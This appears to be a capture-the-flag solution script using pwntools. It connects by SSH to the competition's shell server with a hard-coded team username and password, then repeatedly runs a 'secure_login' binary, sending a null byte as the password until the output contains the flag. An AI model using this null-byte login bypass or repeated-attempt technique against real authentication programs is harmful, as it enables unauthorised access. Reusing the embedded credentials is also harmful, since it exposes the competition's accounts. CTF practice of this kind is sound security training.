from pwn import *

s = ssh(host="shell.actf.co", user="team8096", password="5966d4eb9d6b84e2c501")
for i in range(0x100):
  p = s.run("cd /problems/2021/secure_login && /problems/2021/secure_login/login")

  p.sendline("\x00")

  ret = p.recvall()

  if "actf" in ret:
    print(ret)
    print("FLAG" * 100)
